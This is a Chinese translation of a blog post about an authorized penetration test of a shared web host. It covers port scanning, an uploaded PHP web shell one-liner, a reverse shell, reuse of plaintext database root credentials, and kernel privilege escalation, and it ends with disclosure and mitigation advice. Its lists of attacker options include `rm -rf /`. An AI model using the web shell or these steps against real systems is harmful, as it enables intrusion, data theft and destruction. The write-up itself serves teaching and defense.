<html>
<head>
<title>How I Hacked 40 Websites in 7 minutes</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">我如何在7分钟内黑了40个网站</h1>
<blockquote>原文：<a href="https://medium.com/hackernoon/how-i-hacked-40-websites-in-7-minutes-5b4c28bc8824?source=collection_archive---------1-----------------------#2017-11-23">https://medium.com/hackernoon/how-i-hacked-40-websites-in-7-minutes-5b4c28bc8824?source=collection_archive---------1-----------------------#2017-11-23</a></blockquote><div><div class="ef hi hj hk hl hm"/><div class="hn ho hp hq hr"><figure class="ht hu fm fo hv hw fe ff paragraph-image"><div role="button" tabindex="0" class="hx hy di hz bf ia"><div class="fe ff hs"><img src="../Images/7b404152d3542b969ec07bfba2853bb3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BConY8LqhUtyJQLS6kITvA.png"/></div></div></figure><div class=""/><p id="2cd8" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">去年夏天，我开始学习信息安全和黑客技术。在过去的一年里，我玩了各种战争游戏，捕捉旗帜和渗透测试模拟，不断提高我的黑客技能，学习关于“如何让计算机偏离预期行为”的新知识。</p><p id="79ea" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">长话短说，我的经历总是局限于模拟环境，自从我认为自己是一个白帽黑客(又名好人之一)以来，我从来没有干涉过其他人的事情——完全是真的。</p><p id="51fb" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">直到现在。这将是一个详细的故事，关于我如何侵入一个服务器，托管40个(这是一个确切的数字)网站和我的发现。</p><blockquote class="ka kb kc"><p id="304f" class="jc jd kd je b jf jg jh ji jj jk jl jm ke jo jp jq kf js jt ju kg jw jx jy jz hn dt translated"><strong class="je ig">注意:</strong>要理解文章的技术部分，需要具备一些CS知识。</p></blockquote><p id="de26" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">一个朋友发消息给我说，在他的网站上发现了一个<a class="ae kh" href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)" rel="noopener ugc nofollow" target="_blank"> XSS漏洞</a>，他想让我进一步查看。这是一个重要的阶段，因为我倾向于要求他正式表示我得到了他的许可，可以在他的web应用程序和托管它的服务器上执行完整的测试。答案是肯定的。</p><figure class="kj kk kl km fq hw fe ff paragraph-image"><div class="fe ff ki"><img src="../Images/f248ba457359ff154d9145416c0e9127.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/0*Lnr40S2JhxSY3JaM.gif"/></div></figure><blockquote class="ka kb kc"><p id="e3d3" class="jc jd kd je b jf jg jh ji jj jk jl jm ke jo jp jq kf js jt ju kg jw jx jy jz hn dt translated">在这篇文章的剩余部分，我将把我朋友的网站称为<strong class="je ig">http://example.com</strong></p></blockquote><p id="cbd6" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">第一步总是列举并找到尽可能多的关于你的敌人的信息——同时尽量少惊吓他们。</p><p id="31f8" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">在这个阶段，我们触发计时器并开始扫描。</p><pre class="kj kk kl km fq kn ko kp kq aw kr dt"><span id="1ed0" class="ks kt if ko b fv ku kv l kw kx">$ nmap --top-ports 1000 -T4 -sC <a class="ae kh" href="http://victim.com" rel="noopener ugc nofollow" target="_blank">http://example.com</a><br/>Nmap scan report for example.com {redacted}<br/>Host is up (0.077s latency).<br/>rDNS record for {redacted}: {redacted}<br/>Not shown: 972 filtered ports<br/>PORT      STATE  SERVICE<br/>21/tcp    open   ftp<br/>22/tcp    open   ssh<br/>| ssh-hostkey: <br/>|   {redacted}<br/>80/tcp    open   http<br/>| http-methods: <br/>|_  Potentially risky methods: TRACE<br/>|_http-title: Victim Site<br/>139/tcp   open   netbios-ssn<br/>443/tcp   open   https<br/>| http-methods: <br/>|_  Potentially risky methods: TRACE<br/>|_http-title: Site doesn't have a title (text/html; charset=UTF-8).<br/>|_{redacted}<br/>445/tcp   open   microsoft-ds<br/>5901/tcp  open   vnc-1<br/>| vnc-info: <br/>|   Protocol version: 3.8<br/>|   Security types: <br/>|_    VNC Authentication (2)<br/>8080/tcp  open   http-proxy<br/>|_http-title: 400 Bad Request<br/>8081/tcp  open   blackice-icecap</span></pre><blockquote class="ka kb kc"><p id="3411" class="jc jd kd je b jf jg jh ji jj jk jl jm ke jo jp jq kf js jt ju kg jw jx jy jz hn dt translated">扫描在大约2分钟内完成。</p></blockquote><p id="46dc" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">开放的港口真多啊！通过观察<a class="ae kh" href="https://en.wikipedia.org/wiki/File_Transfer_Protocol" rel="noopener ugc nofollow" target="_blank"> FTP </a>(端口21)和SMB(端口139/445)端口是打开的，我们可以猜测该服务器用于文件托管和文件共享，同时它是一个web服务器(端口80/443和8080/8081处的代理)。</p><figure class="kj kk kl km fq hw fe ff paragraph-image"><div class="fe ff ky"><img src="../Images/c7cecafc9dad4f9ab94833e0300662ae.png" data-original-src="https://miro.medium.com/v2/resize:fit:1276/0*9A9HPkmj-NLW7Pe3."/></div><figcaption class="kz la fg fe ff lb lc bd b be z ek">From The Art of War. Enumerating is key.</figcaption></figure><p id="00b3" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">如果上述扫描的信息不够，可以考虑进行UDP端口扫描并扫描超过前1000个端口。唯一允许我们与之交互的端口(没有凭证)是端口80/443。</p><p id="d69b" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">为了不浪费任何时间，我启动了<code class="eh ld le lf ko b">gobuster</code>来枚举web服务器上任何感兴趣的文件，同时我将手动挖掘信息。</p><pre class="kj kk kl km fq kn ko kp kq aw kr dt"><span id="d825" class="ks kt if ko b fv ku kv l kw kx">$ gobuster -u http://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100</span><span id="c3ae" class="ks kt if ko b fv lg kv l kw kx">/admin<br/>/login</span></pre><p id="8040" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">原来/admin路径是一个“管理工具”,它允许经过验证的用户修改web服务器上的内容。这需要凭证，因为我们既没有用户名也没有密码，我们继续前进。(剧透:gobuster没有发现任何有价值的东西)</p><blockquote class="ka kb kc"><p id="8f84" class="jc jd kd je b jf jg jh ji jj jk jl jm ke jo jp jq kf js jt ju kg jw jx jy jz hn dt translated">到目前为止，我们已经进行了3分钟。还没有什么有用的。</p></blockquote><p id="0342" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">浏览网站时，我们看到它要求我们登录。没问题，我们用一个<a class="ae kh" href="http://www.fakemailgenerator.com" rel="noopener ugc nofollow" target="_blank">假邮件</a>创建一个账户，点击确认邮件，几秒钟后登录。</p><p id="329e" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">该网站欢迎我们，并提示我们导航到我们的个人资料，并更新我们的个人资料图片。多好啊。</p><p id="e9fa" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">看到这个网站看起来是定制的，我倾向于测试一个<a class="ae kh" href="https://www.owasp.org/index.php/Unrestricted_File_Upload" rel="noopener ugc nofollow" target="_blank">无限制文件上传</a>漏洞。在我的终端上，我执行:</p><pre class="kj kk kl km fq kn ko kp kq aw kr dt"><span id="417e" class="ks kt if ko b fv ku kv l kw kx">echo "&lt;?php system(\$_GET['cmd']); ?&gt;" &gt; exploit.php</span></pre><p id="a975" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">我试着上传“图像”,然后就好了！上传者允许<em class="kd">exploit.php</em>文件被上传。当然，它没有缩略图，但这意味着我的文件被上传到了某个地方。</p><figure class="kj kk kl km fq hw fe ff paragraph-image"><div class="fe ff lh"><img src="../Images/56c1686f8c021f04075a88e91a2f61d0.png" data-original-src="https://miro.medium.com/v2/resize:fit:510/format:webp/1*qVLgi2XpE-49BlExZ4F3kA.png"/></div><figcaption class="kz la fg fe ff lb lc bd b be z ek">Get the exploit’s location</figcaption></figure><p id="2a4e" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">在这里，我们希望上传者对上传的文件进行某种处理，检查其文件扩展名，并替换为已接受的文件扩展名，如。jpeg，。jpg，以避免攻击者上传恶意代码远程执行代码，就像你的一样。</p><p id="20bb" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">人们毕竟关心安全。</p><p id="fa1a" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">对吗？对吗？…对吗？</p><pre class="kj kk kl km fq kn ko kp kq aw kr dt"><span id="702e" class="ks kt if ko b fv ku kv l kw kx">`Copy image address` results in the following url being copied to our clipboard:<br/>http://www.example.com/admin/ftp/objects/XXXXXXXXXXXX.php</span></pre><p id="394a" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">看起来我们已经准备好了webshell，并且正在运行:</p><figure class="kj kk kl km fq hw fe ff paragraph-image"><div class="fe ff li"><img src="../Images/bace052397c11686e397f4e9b59507d3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1162/format:webp/1*Iom7SAIfa5FEYqmlowq4bA.png"/></div></figure><p id="3c0e" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">看到web服务器运行<strong class="je ig"> perl </strong>脚本(真的，perl？)我们从我们最喜欢的<a class="ae kh" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" rel="noopener ugc nofollow" target="_blank"> cheatsheet </a>中抓取一个perl reverse shell，设置IP/Port，然后我们得到一个低特权shell——抱歉，没有截图。</p><blockquote class="ka kb kc"><p id="6926" class="jc jd kd je b jf jg jh ji jj jk jl jm ke jo jp jq kf js jt ju kg jw jx jy jz hn dt translated">大约5分钟，我们已经有了一个低特权外壳。</p></blockquote><p id="a4ee" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">令我惊讶的是，服务器上并不是只有一个网站，而是有40个不同的网站。遗憾的是，我没有保存每个细节的截图，但是输出大致如下:</p><pre class="kj kk kl km fq kn ko kp kq aw kr dt"><span id="f798" class="ks kt if ko b fv ku kv l kw kx">$ ls /var/www</span><span id="872c" class="ks kt if ko b fv lg kv l kw kx">access.log site1/ site2/ site3/ {... the list goes on}</span></pre><p id="a973" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">你明白了。令人惊讶的是，所有托管网站的读取权限都是可用的，这意味着我可以读取所有网站的后端代码。我把自己局限于example.com的代码。</p><p id="40e2" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">值得注意的是，在<code class="eh ld le lf ko b">cgi-admin/pages</code>目录中，所有的perl脚本都以root 的身份连接到mysql数据库<strong class="je ig">。数据库的凭证以明文形式存在。让这些成为<em class="kd"> root:pwned42 </em></strong></p><p id="1764" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">果然，服务器正在运行MariaDB，我不得不求助于这个<a class="ae kh" href="https://github.com/dockerfile/mariadb/issues/3" rel="noopener ugc nofollow" target="_blank">问题</a>才能访问数据库。之后，我们执行:</p><pre class="kj kk kl km fq kn ko kp kq aw kr dt"><span id="ccf7" class="ks kt if ko b fv ku kv l kw kx">mysql -u root -p -h localhost victimdbname<br/>Password: pwned42</span></pre><p id="7a5a" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">我们在数据库里有根权限。</p><figure class="kj kk kl km fq hw fe ff paragraph-image"><div class="fe ff lj"><img src="../Images/2a630a19b83aba6ac78b1e3f986361e4.png" data-original-src="https://miro.medium.com/v2/resize:fit:930/format:webp/1*4lU93dNnB95iwLwJ41oEJg.png"/></div><figcaption class="kz la fg fe ff lb lc bd b be z ek">“use databasename;” allows us to access any of the 35 databases and view &amp; modify their contents</figcaption></figure><blockquote class="lk"><p id="4d27" class="ll lm if bd ln lo lp lq lr ls lt jz ek translated">仅仅7分钟后，我们就拥有了对<strong class="ak">35(！idspnonenote)内容的完全读/写权限。)数据库</strong></p></blockquote><p id="5254" class="pw-post-body-paragraph jc jd if je b jf lu jh ji jj lv jl jm jn lw jp jq jr lx jt ju jv ly jx jy jz hn dt translated">在这里，我在道义上有义务停下来，公开我迄今为止的发现。潜在的损害已经很大了。</p><h2 id="106b" class="ks kt if bd lz ma mb mc md me mf mg mh jn mi mj mk jr ml mm mn jv mo mp mq mr dt translated">攻击者可以做什么:</h2><ol class=""><li id="fafd" class="ms mt if je b jf mu jj mv jn mw jr mx jv my jz mz na nb nc dt translated">转储所有数据库的内容，如这里<a class="ae kh" href="https://stackoverflow.com/questions/9497869/export-and-import-all-mysql-databases-at-one-time" rel="noopener ugc nofollow" target="_blank">所述</a>，导致所有35家公司的数据泄露到公共领域。</li><li id="9a1f" class="ms mt if je b jf nd jj ne jn nf jr ng jv nh jz mz na nb nc dt translated">删除所有数据库，有效地删除35家公司的数据</li><li id="8391" class="ms mt if je b jf nd jj ne jn nf jr ng jv nh jz mz na nb nc dt translated">为持久访问留下一个后门，如apache和cronjob，如这里的<a class="ae kh" href="http://blog.tobiasforkel.de/en/2015/03/19/setup-cron-job-for-apache-user/" rel="noopener ugc nofollow" target="_blank">所述</a>，以防他们想要返回。</li></ol><p id="009b" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">我应该注意到mysql进程是以root用户身份运行的，所以我想我应该尝试执行<code class="eh ld le lf ko b">\! whoami</code>来获得root用户。不幸的是，我仍然是阿帕奇人。</p><blockquote class="ka kb kc"><p id="6f6b" class="jc jd kd je b jf jg jh ji jj jk jl jm ke jo jp jq kf js jt ju kg jw jx jy jz hn dt translated">该休息一下了。停止计时。</p></blockquote><h1 id="649f" class="ni kt if bd lz nj nk nl md nm nn no mh np nq nr mk ns nt nu mn nv nw nx mq ny dt translated">还有什么会进一步出错？</h1><p id="a1ab" class="pw-post-body-paragraph jc jd if je b jf mu jh ji jj mv jl jm jn nz jp jq jr oa jt ju jv ob jx jy jz hn dt translated">在披露了我的发现后，我得到了进一步的许可去深入挖掘。</p><p id="3584" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">在想办法将我的权限提升到root并能够造成巨大的潜在损害之前，我在考虑我的受限用户可以阅读哪些其他有趣的文件。</p><p id="6f9f" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">此时，我想起了开放的SMB端口。这意味着在系统中的某个地方应该有一些用户共享的文件夹。简单列举之后，目录<code class="eh ld le lf ko b">/home/samba/secured </code>中出现以下内容(请原谅我的大量审查):</p><figure class="kj kk kl km fq hw fe ff paragraph-image"><div class="fe ff oc"><img src="../Images/8108ae751877d26312ac59fb06e3d0b4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1302/format:webp/1*ocvbxfNLYltft2S5Ps3PvQ.png"/></div></figure><p id="6cdc" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">在所有这些目录中，有每个托管公司用户的文件。其中包括各种敏感数据:</p><ul class=""><li id="e3d4" class="ms mt if je b jf jg jj jk jn od jr oe jv of jz og na nb nc dt translated">。psd/。人工智能文件(设计师知道保持这些私密性有多重要，毕竟这是他们的工作和技术)</li><li id="2b95" class="ms mt if je b jf nd jj ne jn nf jr ng jv nh jz og na nb nc dt translated">Cookie sqlite文件</li><li id="a692" class="ms mt if je b jf nd jj ne jn nf jr ng jv nh jz og na nb nc dt translated">发票</li><li id="2055" class="ms mt if je b jf nd jj ne jn nf jr ng jv nh jz og na nb nc dt translated">盗版电子书(看到这个忍俊不禁)</li><li id="98cf" class="ms mt if je b jf nd jj ne jn nf jr ng jv nh jz og na nb nc dt translated">【WiFi SSIDS的凭证</li></ul><h2 id="2af1" class="ks kt if bd lz ma mb mc md me mf mg mh jn mi mj mk jr ml mm mn jv mo mp mq mr dt translated">攻击者可以做什么:</h2><ol class=""><li id="8b16" class="ms mt if je b jf mu jj mv jn mw jr mx jv my jz mz na nb nc dt translated">在公司办公室外扎营，登录他们的内部网，在本地网络上进行各种有趣的攻击</li><li id="b08b" class="ms mt if je b jf nd jj ne jn nf jr ng jv nh jz mz na nb nc dt translated">将上面列出的所有敏感数据转储到公共领域</li></ol><blockquote class="ka kb kc"><p id="09b3" class="jc jd kd je b jf jg jh ji jj jk jl jm ke jo jp jq kf js jt ju kg jw jx jy jz hn dt translated">我花了一些时间浏览这些文件夹，才意识到这个问题有多严重。<br/>再来一次休息。</p></blockquote><h1 id="f28e" class="ni kt if bd lz nj nk nl md nm nn no mh np nq nr mk ns nt nu mn nv nw nx mq ny dt translated">最后一击</h1><p id="c506" class="pw-post-body-paragraph jc jd if je b jf mu jh ji jj mv jl jm jn nz jp jq jr oa jt ju jv ob jx jy jz hn dt translated">在作为Apache<em class="kd">看了一会儿之后，我决定是时候钓大鱼了，唉，获得root权限。我查阅了一本流行的<a class="ae kh" href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" rel="noopener ugc nofollow" target="_blank">备忘单</a>，开始列举系统中有趣的文件。</em></p><p id="dbb3" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">由于我的挖掘，到目前为止，我已经经历了这些技术的大部分，似乎不能找到一些会增加我的立足点。</p><p id="7830" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">这时候我突然想到。在我经常玩的“捕捉旗帜”挑战中，操作系统通常会打补丁，这是一些故意配置错误的服务，最终会给你提供受欢迎的root权限。然而在现实世界中，人们并不打补丁。</p><blockquote class="ka kb kc"><p id="13eb" class="jc jd kd je b jf jg jh ji jj jk jl jm ke jo jp jq kf js jt ju kg jw jx jy jz hn dt translated">我的意思是，看看Equifax <em class="if">(无法抗拒)。</em></p></blockquote><p id="515a" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">服务器运行的是什么样的Linux？</p><pre class="kj kk kl km fq kn ko kp kq aw kr dt"><span id="7205" class="ks kt if ko b fv ku kv l kw kx">$ cat /etc/issue<br/>CentOS Linux release 7.2.1511 (Core)</span></pre><p id="8240" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">内核是什么版本？</p><figure class="kj kk kl km fq hw fe ff paragraph-image"><div role="button" tabindex="0" class="hx hy di hz bf ia"><div class="fe ff oh"><img src="../Images/b5a34c6efd0059ec3957bb4077261406.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*314bUv-XA3_UIvgEKDP9PQ.png"/></div></div></figure><p id="74b1" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">这看起来像一个旧的内核版本。</p><figure class="kj kk kl km fq hw fe ff paragraph-image"><div role="button" tabindex="0" class="hx hy di hz bf ia"><div class="fe ff fg"><img src="../Images/792997a6e123d111d375853a69cf9502.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*vhbpEPj1gk0MUnxf.png"/></div></div><figcaption class="kz la fg fe ff lb lc bd b be z ek">Does this remind you of something? If not, have a read <a class="ae kh" href="https://www.theguardian.com/technology/2016/oct/21/dirty-cow-linux-vulnerability-found-after-nine-years" rel="noopener ugc nofollow" target="_blank">here</a> (hint: it is VERY serious)</figcaption></figure><p id="c98f" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">我找到了<a class="ae kh" href="http://davemacaulay.com/easily-test-dirty-cow-cve-2016-5195-vulnerability/" rel="noopener ugc nofollow" target="_blank">这篇</a>博文，它让我用这里找到的脚本来测试内核是否易受攻击。</p><figure class="kj kk kl km fq hw fe ff paragraph-image"><div role="button" tabindex="0" class="hx hy di hz bf ia"><div class="fe ff oi"><img src="../Images/ab4adf8bf8a46a9295fe9a37df014d99.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7a2tb6P72aNH4shZW0qx0Q.png"/></div></div><figcaption class="kz la fg fe ff lb lc bd b be z ek">Timestamps &amp; Firefox restored sites redacted</figcaption></figure><p id="d60d" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">其次是:</p><figure class="kj kk kl km fq hw fe ff paragraph-image"><div class="fe ff oj"><img src="../Images/b1407c3722c4f016bb1040999d960ee0.png" data-original-src="https://miro.medium.com/v2/resize:fit:982/format:webp/1*3ZoWXbpfqZHdJUn0Ia2JWw.png"/></div></figure><h2 id="3036" class="ks kt if bd lz ma mb mc md me mf mg mh jn mi mj mk jr ml mm mn jv mo mp mq mr dt translated">游戏结束。</h2><p id="74c6" class="pw-post-body-paragraph jc jd if je b jf mu jh ji jj mv jl jm jn nz jp jq jr oa jt ju jv ob jx jy jz hn dt translated">我立即写了一封电子邮件，充分披露了上述每一步的细节和潜在影响，然后结束了这个夜晚。咻。</p><h2 id="4b8a" class="ks kt if bd lz ma mb mc md me mf mg mh jn mi mj mk jr ml mm mn jv mo mp mq mr dt translated">攻击者可以做什么:</h2><ol class=""><li id="6a3c" class="ms mt if je b jf mu jj mv jn mw jr mx jv my jz mz na nb nc dt translated">读取/修改服务器上的所有文件</li><li id="5196" class="ms mt if je b jf nd jj ne jn nf jr ng jv nh jz mz na nb nc dt translated">留下一个持久的后门(就像apache一样)</li><li id="79be" class="ms mt if je b jf nd jj ne jn nf jr ng jv nh jz mz na nb nc dt translated">安装恶意软件并可能将恶意软件传播到服务器的内部网</li><li id="82f0" class="ms mt if je b jf nd jj ne jn nf jr ng jv nh jz mz na nb nc dt translated">安装勒索软件(劫持35家公司的数据库和所有托管公司的数据可不是小事)</li><li id="b3f6" class="ms mt if je b jf nd jj ne jn nf jr ng jv nh jz mz na nb nc dt translated">将服务器用作加密货币矿工</li><li id="b225" class="ms mt if je b jf nd jj ne jn nf jr ng jv nh jz mz na nb nc dt translated">将服务器用作代理</li><li id="1559" class="ms mt if je b jf nd jj ne jn nf jr ng jv nh jz mz na nb nc dt translated">将服务器用作C2C服务器</li><li id="be9e" class="ms mt if je b jf nd jj ne jn nf jr ng jv nh jz mz na nb nc dt translated">将服务器用作僵尸网络的一部分</li><li id="ad80" class="ms mt if je b jf nd jj ne jn nf jr ng jv nh jz mz na nb nc dt translated">…(发挥你的想象力)</li><li id="363f" class="ms mt if je b jf nd jj ne jn nf jr ng jv nh jz mz na nb nc dt translated"><strong class="je ig"> rm -rf / </strong>(不是开玩笑)</li></ol><p id="8146" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">第二天，我的朋友(他联系了运营服务器的公司)联系了我，并告知我文件上传程序中的错误已经修复。</p><h1 id="9df1" class="ni kt if bd lz nj nk nl md nm nn no mh np nq nr mk ns nt nu mn nv nw nx mq ny dt translated">TL；博士；医生</h1><p id="b1b5" class="pw-post-body-paragraph jc jd if je b jf mu jh ji jj mv jl jm jn nz jp jq jr oa jt ju jv ob jx jy jz hn dt translated">总而言之，我们发现:</p><ol class=""><li id="c3a8" class="ms mt if je b jf jg jj jk jn od jr oe jv of jz mz na nb nc dt translated">一个web应用程序有一个不受限的文件上传漏洞，导致进入低权限外壳。</li><li id="e4a8" class="ms mt if je b jf nd jj ne jn nf jr ng jv nh jz mz na nb nc dt translated">mysql数据库的凭证，这导致对35个数据库的读/写访问</li><li id="789e" class="ms mt if je b jf nd jj ne jn nf jr ng jv nh jz mz na nb nc dt translated">大量可读的敏感文件</li></ol><p id="a52c" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">最后，我们滥用一个未打补丁的内核来获取root访问权限。</p><h1 id="e719" class="ni kt if bd lz nj nk nl md nm nn no mh np nq nr mk ns nt nu mn nv nw nx mq ny dt translated">缓解措施—建议</h1><p id="fee7" class="pw-post-body-paragraph jc jd if je b jf mu jh ji jj mv jl jm jn nz jp jq jr oa jt ju jv ob jx jy jz hn dt translated">让我们从给我们最初立足点的上传者开始。由于整个web应用程序的后端都是用perl编写的——而且我不会说perl——我真的不能给出修复的建议。</p><p id="f68f" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">我建议的一个解决办法是在2017年不使用perl，但这只是我的观点，请随意证明我是错的。</p><p id="c316" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">关于文件系统，我建议根据最小特权原则为用户分配适当的文件权限。这样，即使像apache这样的低特权用户可以访问，他们也不能读取任何敏感文件。</p><p id="5a94" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">在同一个服务器上运行所有的网站是一个坏主意，我不确定一个文档化的方法是否能解决这个问题。</p><p id="1197" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">对所有数据库使用相同的凭证肯定不是一个好主意。</p><blockquote class="ka kb kc"><p id="359a" class="jc jd kd je b jf jg jh ji jj jk jl jm ke jo jp jq kf js jt ju kg jw jx jy jz hn dt translated">单点故障通常不太好。</p></blockquote><p id="2468" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">最后，<strong class="je ig">修补一切</strong>。这是字面上的1个命令:<code class="eh ld le lf ko b"><strong class="je ig">su -c 'yum update'</strong></code> <strong class="je ig"> </strong>(具体CentOS)</p><h2 id="1688" class="ks kt if bd lz ma mb mc md me mf mg mh jn mi mj mk jr ml mm mn jv mo mp mq mr dt translated">感谢你的阅读和坚持到这里，抱歉写了这么长的帖子。我想彻底，这是一个严重的情况😄</h2><h2 id="9c6c" class="ks kt if bd lz ma mb mc md me mf mg mh jn mi mj mk jr ml mm mn jv mo mp mq mr dt translated">如果你喜欢，就把那个按钮砸50次！</h2></div><div class="ab cl ok ol hc om" role="separator"><span class="on bw bk oo op oq"/><span class="on bw bk oo op oq"/><span class="on bw bk oo op"/></div><div class="hn ho hp hq hr"><h2 id="4fcf" class="ks kt if bd lz ma mb mc md me mf mg mh jn mi mj mk jr ml mm mn jv mo mp mq mr dt translated">无耻的插头</h2><figure class="kj kk kl km fq hw fe ff paragraph-image"><div class="fe ff or"><img src="../Images/07e646106884f15009a889ff2d2574cb.png" data-original-src="https://miro.medium.com/v2/resize:fit:800/format:webp/1*7eZKhr8-MTumX9D5Og1-sA.png"/></div></figure><p id="4fb1" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">我是一名来自希腊的电子和计算机工程专业的五年级学生。我对信息安全、现代商业中的区块链研究和应用以及自动驾驶汽车感兴趣。了解更多我在gakonst.com<a class="ae kh" href="https://gakonst.com" rel="noopener ugc nofollow" target="_blank">做的事情</a></p><p id="4249" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">如果你喜欢这篇文章的内容，并想了解我的最新作品，请在<a class="ae kh" rel="noopener" href="/@gakonst"> Medium </a>和<a class="ae kh" href="https://twitter.com/gakonst" rel="noopener ugc nofollow" target="_blank"> Twitter </a>上关注我</p><figure class="kj kk kl km fq hw"><div class="bz el l di"><div class="os ot l"/></div></figure></div></div>    
</body>
</html>